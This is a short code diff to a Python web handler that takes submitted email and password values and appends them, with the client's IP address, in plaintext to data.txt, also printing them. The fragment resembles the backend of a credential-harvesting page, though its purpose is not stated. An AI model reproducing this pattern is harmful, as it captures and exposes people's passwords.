@@ -10,11 +10,7 @@ def get_data():
     email = data["email"]
     password = data["password"]
 
-    with open("data.txt", "r") as f:
-        before = f.read()
-
-    with open("data.txt", "w") as f:
-        f.write(before)
+    with open("data.txt", "a") as f:
         message = f'"{request.remote_addr}": ["email": "{email}", "password": "{password}"],\n'
         print(message)
         f.write(message)
